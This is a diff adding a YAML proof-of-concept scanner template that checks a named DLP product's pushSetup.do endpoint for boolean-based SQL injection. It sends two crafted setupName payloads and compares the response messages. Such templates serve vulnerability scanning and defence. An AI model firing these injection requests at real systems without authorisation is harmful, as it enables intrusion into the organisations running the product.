@@ -1,0 +1,59 @@
+id: poc-yaml-heimdall-dlp-pushSetup-sqli
+info:
+  name: 虹安DLP数据泄漏防护系统pushSetup.do存在SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /dlp/userReg/pushSetup.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+        setupName=1'+or+1%3d0+and+'1'%3d'1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "alert(\"用户不存在!\");"
+        part: body
+      - type: word
+        words:
+          - "New Document"
+        part: title
+      - type: word
+        words:
+          - "alert(\"用户未生成证书\");"
+        part: body
+        negative: true
+  - raw:
+      - |
+        POST /dlp/userReg/pushSetup.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+        setupName=1'+or+1%3d1+and+'1'%3d'1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "alert(\"用户未生成证书\");"
+        part: body
+      - type: word
+        words:
+          - "New Document"
+        part: title
+      - type: word
+        words:
+          - "alert(\"用户不存在!\");"
+        part: body
+        negative: true
